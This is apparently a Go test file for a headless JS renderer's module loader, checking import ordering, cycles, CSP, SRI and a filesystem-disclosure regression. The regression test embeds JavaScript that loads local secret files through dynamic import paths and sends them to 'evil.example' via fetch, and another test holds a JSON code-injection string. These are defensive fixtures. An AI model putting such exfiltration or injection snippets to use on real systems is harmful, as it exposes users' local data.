package js_test

import (
	"crypto/sha256"
	"encoding/base64"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/christopherdavenport/unblink/internal/js"
)

// Static <script type=module> entries load through the per-render module registry
// (ADR 0018, amended 2026-11-27), not an esbuild bundle. These tests pin the two
// reasons for that — esbuild's bundler read the local filesystem for a non-literal
// relative import, and it fetched every lazy import() target at load — plus the
// module semantics the registry has to get right now that it carries static graphs.

// renderModules renders page with an exact-URL transport and returns #out's text,
// the transport (for its fetch log) and the render diagnostics.
func renderModules(t *testing.T, page string, routes map[string]string) (string, *exactTransport, *js.RenderResult) {
	t.Helper()
	tr := &exactTransport{routes: routes}
	diag := &js.RenderResult{}
	out := renderWithEnv(t, page, js.Env{Transport: tr, Diag: diag})
	const open = `<div id="out">`
	i := strings.Index(out, open)
	if i < 0 {
		t.Fatalf("no #out in output:\n%s", out)
	}
	rest := out[i+len(open):]
	return rest[:strings.Index(rest, "</div>")], tr, diag
}

func (e *exactTransport) fetchedURL(u string) bool {
	e.mu.Lock()
	defer e.mu.Unlock()
	for _, f := range e.fetched {
		if f == u {
			return true
		}
	}
	return false
}

func (e *exactTransport) fetchCount(u string) int {
	e.mu.Lock()
	defer e.mu.Unlock()
	n := 0
	for _, f := range e.fetched {
		if f == u {
			n++
		}
	}
	return n
}

// TestModuleGlobImportCannotReadLocalFS is the regression test for the esbuild
// glob-import file disclosure: bundling a module whose dynamic import (or require)
// argument is a non-literal relative path made esbuild expand it as a glob against
// the real filesystem — the process working directory for a fetched module, "/" for
// an inline one — and inline the matching files, which page JS could then read and
// send anywhere. Every variant must leave local bytes out of the DOM and out of
// every request, and return promptly (the inline variant used to walk "/").
func TestModuleGlobImportCannotReadLocalFS(t *testing.T) {
	root := t.TempDir()
	write := func(rel, body string) {
		t.Helper()
		p := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	// The working directory is root/cwd; root itself is the "../" target.
	write("secret.json", `{"k":"LOCAL-SECRET-PARENT-JSON"}`)
	write("secret.js", `export const k = "LOCAL-SECRET-PARENT-JS";`)
	write("cwd/secret.json", `{"k":"LOCAL-SECRET-JSON"}`)
	write("cwd/secret.js", `export const k = "LOCAL-SECRET-JS"; export default k;`)
	write("cwd/secret.txt", `LOCAL-SECRET-TXT`)
	write("cwd/sub/deep.json", `{"k":"LOCAL-SECRET-DEEP"}`)
	t.Chdir(filepath.Join(root, "cwd"))

	// Each body leaks whatever it manages to load into #out and into a request.
	const leak = `.then(function (m) {
		var s = JSON.stringify(m.default === undefined ? m : m.default) + JSON.stringify(m.k || '');
		document.getElementById('out').textContent = 'LOADED ' + s;
		fetch('https://evil.example/x?d=' + encodeURIComponent(s));
	}, function (e) { document.getElementById('out').textContent = 'REJECTED'; });`
	bodies := map[string]string{
		"template-json":   "const n = 'secret'; import(`./${n}.json`)" + leak,
		"concat-js":       "const n = 'secret'; import('./' + n + '.js')" + leak,
		"concat-any":      "const n = 'secret.txt'; import('./' + n)" + leak,
		"recursive":       "const n = 'sub/deep'; import(`./${n}.json`)" + leak,
		"parent-template": "const n = 'secret'; import(`../${n}.json`)" + leak,
		"parent-concat":   "const n = 'secret'; import('../' + n + '.js')" + leak,
		"require-concat": `const n = 'secret'; let m; try { m = require('./' + n + '.json'); } catch (e) { m = null; }
			Promise.resolve(m ? {default: m} : Promise.reject(new Error('no')))` + leak,
		"require-template": "const n = 'secret'; let m; try { m = require(`../${n}.json`); } catch (e) { m = null; }\n" +
			"Promise.resolve(m ? {default: m} : Promise.reject(new Error('no')))" + leak,
	}
	for name, body := range bodies {
		for _, kind := range []string{"external", "inline", "imported"} {
			t.Run(name+"/"+kind, func(t *testing.T) {
				routes := map[string]string{}
				var page string
				switch kind {
				case "external":
					routes[origin+"/app.mjs"] = body
					page = `<html><body><div id="out">x</div><script type="module" src="/app.mjs"></script></body></html>`
				case "inline":
					page = `<html><body><div id="out">x</div><script type="module">` + body + `</script></body></html>`
				case "imported": // the import sits in a static dependency, not the entry
					routes[origin+"/app.mjs"] = `import './dep.mjs';`
					routes[origin+"/dep.mjs"] = body
					page = `<html><body><div id="out">x</div><script type="module" src="/app.mjs"></script></body></html>`
				}
				start := time.Now()
				tr := &exactTransport{routes: routes}
				diag := &js.RenderResult{}
				out := renderWithEnv(t, page, js.Env{Transport: tr, Diag: diag})
				if d := time.Since(start); d > 20*time.Second {
					t.Errorf("render took %v — a filesystem walk?", d)
				}
				if strings.Contains(out, "LOCAL-SECRET") {
					t.Errorf("local file contents reached the DOM:\n%s", out)
				}
				if !strings.Contains(out, "REJECTED") {
					t.Errorf("the import should have rejected (nothing serves it):\n%s", out)
				}
				tr.mu.Lock()
				defer tr.mu.Unlock()
				for _, u := range tr.fetched {
					if strings.Contains(u, "LOCAL-SECRET") || strings.Contains(u, "LOCAL") {
						t.Errorf("a request carried local file contents: %s", u)
					}
				}
			})
		}
	}
}

// A literal import() target that the page never calls must not be fetched at load —
// neither it nor its static graph. The bundler inlined both (410 extra script
// fetches on one real page).
func TestModuleLazyImportNotFetchedAtLoad(t *testing.T) {
	out, tr, diag := renderModules(t, `<html><body><div id="out">x</div>
		<script type="module" src="/app.mjs"></script></body></html>`, map[string]string{
		origin + "/app.mjs": `import { v } from './dep.js';
			const routes = { lazy: () => import('./lazy.js'), other: () => import('./other.js') };
			window.__routes = routes;
			document.getElementById('out').textContent = 'BOOTED ' + v;`,
		origin + "/dep.js":   `export const v = 'dep';`,
		origin + "/lazy.js":  `import './deep.js'; export const lazy = 1;`,
		origin + "/deep.js":  `export const deep = 1;`,
		origin + "/other.js": `export const other = 1;`,
	})
	if out != "BOOTED dep" {
		t.Fatalf("#out=%q want %q (errors: %v)", out, "BOOTED dep", diag.Errors)
	}
	for _, u := range []string{"/lazy.js", "/deep.js", "/other.js"} {
		if tr.fetchedURL(origin + u) {
			t.Errorf("%s was fetched at load although import() was never called", u)
		}
	}
}

// A lazy chunk that fails to load rejects only that import() promise: the entry
// that declares it still boots, and a sibling lazy chunk still loads.
func TestModuleLazyImportFailureIsNotFatal(t *testing.T) {
	out, _, diag := renderModules(t, `<html><body><div id="out">x</div>
		<script type="module" src="/app.mjs"></script></body></html>`, map[string]string{
		origin + "/app.mjs": `const log = ['booted'];
			const done = () => { document.getElementById('out').textContent = log.join(','); };
			import('./missing.js').then(() => log.push('missing-loaded'), () => log.push('missing-rejected'))
				.then(() => import('./ok.js')).then(m => log.push(m.v), () => log.push('ok-rejected')).then(done);
			done();`,
		origin + "/ok.js": `export const v = 'ok-loaded';`,
	})
	if out != "booted,missing-rejected,ok-loaded" {
		t.Errorf("#out=%q want booted,missing-rejected,ok-loaded (errors: %v)", out, diag.Errors)
	}
}

// A static dependency that fails to load fails the entry that needs it, with a
// recorded error — and only that entry: module scripts before and after it run.
func TestModuleStaticDepFailureFailsOnlyThatEntry(t *testing.T) {
	out, _, diag := renderModules(t, `<html><body><div id="out"></div>
		<script type="module" src="/first.mjs"></script>
		<script type="module" src="/broken.mjs"></script>
		<script type="module">import './gone-inline.js'; document.getElementById('out').textContent += 'INLINE-BROKEN-RAN,';</script>
		<script type="module" src="/syntax.mjs"></script>
		<script type="module" src="/last.mjs"></script></body></html>`, map[string]string{
		origin + "/first.mjs":  `document.getElementById('out').textContent += 'first,';`,
		origin + "/broken.mjs": `import './gone.js'; document.getElementById('out').textContent += 'BROKEN-RAN,';`,
		origin + "/syntax.mjs": `export const = ;`,
		origin + "/last.mjs":   `document.getElementById('out').textContent += 'last';`,
	})
	if out != "first,last" {
		t.Errorf("#out=%q want %q", out, "first,last")
	}
	joined := strings.Join(diag.Errors, "\n")
	for _, want := range []string{"gone.js", "gone-inline.js", "syntax.mjs"} {
		if !strings.Contains(joined, want) {
			t.Errorf("no recorded error names %s; errors:\n%s", want, joined)
		}
	}
}

// Module scripts run in document order after classic scripts and before
// DOMContentLoaded; each entry's static graph evaluates post-order (dependencies
// first, in import order) and a module shared by two entries evaluates once.
func TestModuleOrdering(t *testing.T) {
	out, tr, diag := renderModules(t, `<html><body><div id="out"></div>
		<script>window.log = function (s) { document.getElementById('out').textContent += s + ' '; };
			document.addEventListener('DOMContentLoaded', function () { log('DCL'); });</script>
		<script type="module" src="/a.mjs"></script>
		<script type="module">import './shared.js'; import './c.js'; log('inline');</script>
		<script type="module" src="/b.mjs"></script>
		<script>log('classic-after');</script></body></html>`, map[string]string{
		origin + "/a.mjs":     `import './a1.js'; import './shared.js'; import './a2.js'; log('a');`,
		origin + "/a1.js":     `import './a1x.js'; log('a1');`,
		origin + "/a1x.js":    `log('a1x');`,
		origin + "/a2.js":     `log('a2');`,
		origin + "/shared.js": `log('shared');`,
		origin + "/c.js":      `log('c');`,
		origin + "/b.mjs":     `import './shared.js'; log('b');`,
	})
	const want = "classic-after a1x a1 shared a2 a c inline b DCL "
	if out != want {
		t.Errorf("order=%q\n want %q (errors: %v)", out, want, diag.Errors)
	}
	if n := tr.fetchCount(origin + "/shared.js"); n != 1 {
		t.Errorf("shared.js fetched %d times, want 1", n)
	}
}

// An import cycle neither deadlocks nor double-evaluates, and the cyclic importer
// holds the real (live) namespace of the module still being evaluated.
func TestModuleCycle(t *testing.T) {
	out, _, diag := renderModules(t, `<html><body><div id="out">x</div>
		<script type="module" src="/a.js"></script></body></html>`, map[string]string{
		origin + "/a.js": `import { bName, callA } from './b.js';
			window.__evalA = (window.__evalA || 0) + 1;
			export function aName() { return 'A'; }
			export let late = 'unset';
			late = 'set';
			document.getElementById('out').textContent = [bName(), callA(), window.__evalA, window.__evalB].join('|');`,
		origin + "/b.js": `import { aName, late } from './a.js';
			window.__evalB = (window.__evalB || 0) + 1;
			export function bName() { return 'B'; }
			export function callA() { return aName() + ':' + late; }`,
	})
	if out != "B|A:set|1|1" {
		t.Errorf("#out=%q want %q (errors: %v)", out, "B|A:set|1|1", diag.Errors)
	}
}

// One instance per module URL across static entries AND dynamic import() — the
// ADR 0018 "one React" property, which a per-entry bundle could not give a module
// reached both statically and dynamically.
func TestModuleSingletonAcrossStaticAndDynamic(t *testing.T) {
	out, tr, diag := renderModules(t, `<html><body><div id="out">x</div>
		<script type="module" src="/app.mjs"></script>
		<script type="module">
			import * as state from './state.js';
			state.bump();
			const viaLazy = await0(import('./lazy.js'));
			function await0(p) { return p; }
			Promise.all([viaLazy, import('./state.js'), import('/state.js')]).then(function (r) {
				document.getElementById('out').textContent = [
					window.__stateEvals, r[0].count(), r[1] === r[2], r[1].count === state.count, state.count(),
				].join('|');
			});
		</script></body></html>`, map[string]string{
		origin + "/app.mjs":  `import { bump } from './state.js'; bump();`,
		origin + "/state.js": `window.__stateEvals = (window.__stateEvals || 0) + 1; let n = 0; export function bump() { n++; } export function count() { return n; }`,
		origin + "/lazy.js":  `import { bump, count } from './state.js'; bump(); export { count };`,
	})
	if out != "1|3|true|true|3" {
		t.Errorf("#out=%q want %q (errors: %v)", out, "1|3|true|true|3", diag.Errors)
	}
	if n := tr.fetchCount(origin + "/state.js"); n != 1 {
		t.Errorf("state.js fetched %d times, want 1", n)
	}
}

// The same external module named by two script tags evaluates once (the module
// map), where two identical inline modules each run.
func TestModuleSameSrcTwiceRunsOnce(t *testing.T) {
	out, _, _ := renderModules(t, `<html><body><div id="out"></div>
		<script type="module" src="/once.mjs"></script>
		<script type="module" src="/once.mjs"></script>
		<script type="module">document.getElementById('out').textContent += 'i';</script>
		<script type="module">document.getElementById('out').textContent += 'i';</script></body></html>`, map[string]string{
		origin + "/once.mjs": `document.getElementById('out').textContent += 'E';`,
	})
	if out != "Eii" {
		t.Errorf("#out=%q want %q", out, "Eii")
	}
}

// Import/export forms through the per-module CommonJS transform: default, named,
// namespace, re-export, export *, live bindings, JSON, and import.meta.url.
func TestModuleSyntaxForms(t *testing.T) {
	out, _, diag := renderModules(t, `<html><body><div id="out">x</div>
		<script type="module" src="/sub/app.mjs"></script>
		<script type="module">window.__inlineMeta = import.meta.url; window.__inlineThisScript = String(document.currentScript);</script>
		<script>document.addEventListener('DOMContentLoaded', function () {
			document.getElementById('out').textContent += '|' + window.__inlineMeta + '|' + window.__inlineThisScript;
		});</script></body></html>`, map[string]string{
		origin + "/sub/app.mjs": `import def, { named as renamed, counter, inc } from './lib.js';
			import * as ns from './lib.js';
			import { viaReexport, star1, star2 } from './barrel.js';
			import data from './data.json';
			import cjsDefault from './plain.js';
			inc(); inc();
			document.getElementById('out').textContent = [
				def(), renamed, counter, ns.counter, ns.default === def, viaReexport, star1, star2,
				data.answer, data.list.length, typeof cjsDefault, import.meta.url, String(document.currentScript),
				new URL('./asset.png', import.meta.url).pathname, import.meta.resolve('./lib.js'),
			].join('|');`,
		origin + "/sub/lib.js": `export default function () { return 'default'; }
			export const named = 'named'; export let counter = 0; export function inc() { counter++; }`,
		origin + "/sub/barrel.js": `export { named as viaReexport } from './lib.js'; export * from './stars.js';`,
		origin + "/sub/stars.js":  `export const star1 = 's1'; export const star2 = 's2'; export default 'not-re-exported';`,
		origin + "/sub/data.json": `{"answer": 42, "list": [1, 2, 3], "text": "</script> "}`,
		origin + "/sub/plain.js":  `window.__plain = 1;`,
	})
	const want = "default|named|2|2|true|named|s1|s2|42|3|object|https://example.com/sub/app.mjs|null|/sub/asset.png|https://example.com/sub/lib.js" +
		"|https://example.com/page|null"
	if out != want {
		t.Errorf("#out=%q\n want %q (errors: %v)", out, want, diag.Errors)
	}
}

// A JSON module's body is data: a body that is not valid JSON fails the import
// instead of being spliced into the module wrapper as code.
func TestModuleJSONIsNotCode(t *testing.T) {
	out, _, diag := renderModules(t, `<html><body><div id="out">x</div>
		<script type="module">
			import('./evil.json').then(function () { document.getElementById('out').textContent = 'LOADED ' + window.__pwned; },
				function () { document.getElementById('out').textContent = 'REJECTED ' + window.__pwned; });
		</script></body></html>`, map[string]string{
		origin + "/evil.json": `0); window.__pwned = 1; (0`,
	})
	if out != "REJECTED undefined" {
		t.Errorf("#out=%q want %q (errors: %v)", out, "REJECTED undefined", diag.Errors)
	}
}

// A non-literal import() resolves against the importing module's URL (webpack's
// ESM chunk loader does import("./" + chunkName)), whatever its argument contains.
func TestModuleNonLiteralDynamicImport(t *testing.T) {
	out, _, diag := renderModules(t, `<html><body><div id="out">x</div>
		<script type="module" src="/assets/runtime.js"></script></body></html>`, map[string]string{
		origin + "/assets/runtime.js": `const p = { u: (e) => 'chunk-' + e, wrap: (s) => s };
			const f = (a) => (b) => a + b;
			Promise.all([
				import('./' + p.u('a') + '.js'),
				import(p.wrap(p.wrap(p.wrap('./chunk-b'))) + '.js'),
				import(f('./chunk-')((() => 'c')()) + '.js'),
			]).then((m) => { document.getElementById('out').textContent = m.map((x) => x.v).join(','); },
				(e) => { document.getElementById('out').textContent = 'ERR ' + e; });`,
		origin + "/assets/chunk-a.js": `export const v = 'a';`,
		origin + "/assets/chunk-b.js": `export const v = 'b';`,
		origin + "/assets/chunk-c.js": `export const v = 'c';`,
	})
	if out != "a,b,c" {
		t.Errorf("#out=%q want %q (errors: %v)", out, "a,b,c", diag.Errors)
	}
}

// Import-map scopes select by the importing module's URL on a static entry's graph.
func TestModuleStaticEntryImportMapScopes(t *testing.T) {
	out, _, diag := renderModules(t, `<html><body><div id="out">x</div>
		<script type="importmap">{"imports":{"lib":"/lib-top.js","app":"/scoped/app.mjs"},"scopes":{"/scoped/":{"lib":"/lib-scoped.js"}}}</script>
		<script type="module">
			import { which } from 'lib';
			import { scoped } from 'app';
			document.getElementById('out').textContent = which + '|' + scoped;
		</script></body></html>`, map[string]string{
		origin + "/lib-top.js":     `export const which = 'top';`,
		origin + "/lib-scoped.js":  `export const which = 'scoped';`,
		origin + "/scoped/app.mjs": `import { which } from 'lib'; export const scoped = which;`,
	})
	if out != "top|scoped" {
		t.Errorf("#out=%q want %q (errors: %v)", out, "top|scoped", diag.Errors)
	}
}

// CSP script-src gates the module entry; a blocked entry fetches and runs nothing,
// an allowed one runs with its static dependencies (which inherit the decision).
func TestModuleCSPGatesEntryAndGraph(t *testing.T) {
	bodies := map[string]string{
		"/ok.mjs":      `import './ok-dep.js'; document.getElementById('out').textContent += 'ok,';`,
		"/ok-dep.js":   `document.getElementById('out').textContent += 'ok-dep,';`,
		"/evil.mjs":    `import './evil-dep.js'; document.getElementById('out').textContent += 'EVIL,';`,
		"/evil-dep.js": `document.getElementById('out').textContent += 'EVIL-DEP,';`,
	}
	tr := &cspRecordTransport{bodies: bodies}
	doc, _ := renderCSP(t, `<html><body><div id="out"></div>
		<script type="module" src="https://bad.example/evil.mjs"></script>
		<script type="module">document.getElementById('out').textContent += 'INLINE-NO-NONCE,';</script>
		<script type="module" nonce="n1">document.getElementById('out').textContent += 'inline-nonce,';</script>
		<script type="module" src="/ok.mjs"></script></body></html>`,
		"https://example.com/page", cspHeader("script-src 'self' 'nonce-n1'"), tr)
	if got := divText(t, doc, "out"); got != "inline-nonce,ok-dep,ok," {
		t.Errorf("#out=%q want %q", got, "inline-nonce,ok-dep,ok,")
	}
	if tr.requested("evil") {
		t.Error("a CSP-blocked module entry (or its dependency) was fetched")
	}
}

// SRI on a module entry is checked over the bytes that then run: a match runs the
// entry and its dependencies, a mismatch runs neither.
func TestModuleSRIEntry(t *testing.T) {
	const entry = `import './sri-dep.js'; document.getElementById('out').textContent += 'entry';`
	sum := sha256.Sum256([]byte(entry))
	good := "sha256-" + base64.StdEncoding.EncodeToString(sum[:])
	bad := "sha256-" + base64.StdEncoding.EncodeToString(make([]byte, 32))
	for name, tc := range map[string]struct{ integrity, want string }{
		"match":    {good, "dep,entry"},
		"mismatch": {bad, ""},
	} {
		t.Run(name, func(t *testing.T) {
			out, tr, _ := renderModules(t, `<html><body><div id="out"></div>
				<script type="module" src="/sri.mjs" integrity="`+tc.integrity+`"></script></body></html>`, map[string]string{
				origin + "/sri.mjs":    entry,
				origin + "/sri-dep.js": `document.getElementById('out').textContent += 'dep,';`,
			})
			if out != tc.want {
				t.Errorf("#out=%q want %q", out, tc.want)
			}
			if name == "mismatch" && tr.fetchedURL(origin+"/sri-dep.js") {
				t.Error("a dependency of an integrity-failed module entry was fetched")
			}
			// The verified bytes are the ones that run: a second fetch of the entry
			// could be answered with different bytes than the hash was taken over.
			if n := tr.fetchCount(origin + "/sri.mjs"); n != 1 {
				t.Errorf("integrity-checked entry fetched %d times, want 1", n)
			}
		})
	}
}

// A module that throws while evaluating fails each entry that imports it with that
// same error value, is evaluated only once, and leaves unrelated entries running.
func TestModuleEvaluationErrorPropagates(t *testing.T) {
	out, _, diag := renderModules(t, `<html><body><div id="out"></div>
		<script type="module" src="/a.mjs"></script>
		<script type="module" src="/b.mjs"></script>
		<script type="module">
			import('./thrower.js').then(function () { return 'loaded'; }, function (e) { return 'rejected:' + (e && e.message || e); })
				.then(function (s) { document.getElementById('out').textContent += '|' + s + '|evals=' + window.__throwerEvals; });
		</script>
		<script type="module" src="/ok.mjs"></script></body></html>`, map[string]string{
		origin + "/a.mjs":      `import './thrower.js'; document.getElementById('out').textContent += 'A-RAN';`,
		origin + "/b.mjs":      `import './thrower.js'; document.getElementById('out').textContent += 'B-RAN';`,
		origin + "/thrower.js": `window.__throwerEvals = (window.__throwerEvals || 0) + 1; throw new RangeError('boom-from-thrower');`,
		origin + "/ok.mjs":     `document.getElementById('out').textContent += 'ok';`,
	})
	if !strings.HasPrefix(out, "ok|rejected:") || !strings.Contains(out, "boom-from-thrower") || !strings.HasSuffix(out, "|evals=1") {
		t.Errorf("#out=%q want ok|rejected:…boom-from-thrower…|evals=1", out)
	}
	joined := strings.Join(diag.Errors, "\n")
	if strings.Count(joined, "RangeError: boom-from-thrower") < 2 {
		t.Errorf("each failing entry should record the dependency's own error; errors:\n%s", joined)
	}
	if strings.Contains(joined, "moduleRegistry") {
		t.Errorf("a Go symbol leaked into the recorded error:\n%s", joined)
	}
}

// A page-global `require` (an AMD loader such as Ember's loader.js) is what a
// free `require` in an ES module refers to. The CommonJS wrapper must not
// capture those calls: an id the module system cannot resolve goes to the page.
func TestModulePageGlobalRequireIsNotShadowed(t *testing.T) {
	page := `<html><body><div id="out"></div>
		<script>
			var registry = { "app/lib/api": { hello: "from-loader" } };
			window.require = function (id) { if (!(id in registry)) throw new Error("loader: no module " + id); return registry[id]; };
		</script>
		<script type="module" src="/app.mjs"></script></body></html>`
	out, _, diag := renderModules(t, page, map[string]string{
		"https://example.com/app.mjs": `import { dep } from './dep.mjs';
			function lookup(id) { return require(id); }
			var missing = 'none';
			try { lookup('app/lib/nope'); } catch (e) { missing = e.message; }
			document.getElementById('out').textContent = dep + ',' + lookup('app/lib/api').hello + ',' + require("app/lib/api").hello + ',' + missing;`,
		"https://example.com/dep.mjs": `export const dep = 'static-dep';`,
	})
	if out != "static-dep,from-loader,from-loader,loader: no module app/lib/nope" {
		t.Errorf("page require was shadowed:\n%s\nerrors: %v", out, diag.Errors)
	}
}

// With no page-global require, an unresolvable specifier is still an error.
func TestModuleUnresolvableRequireStillFails(t *testing.T) {
	out, _, _ := renderModules(t, `<html><body><div id="out">x</div><script type="module" src="/app.mjs"></script></body></html>`,
		map[string]string{"https://example.com/app.mjs": `var r = 'ok'; try { require('bare/spec'); } catch (e) { r = /cannot resolve/.test(String(e && e.message || e)); } document.getElementById('out').textContent = String(r);`})
	if out != "true" {
		t.Errorf("want a resolution error for an unresolvable require:\n%s", out)
	}
}
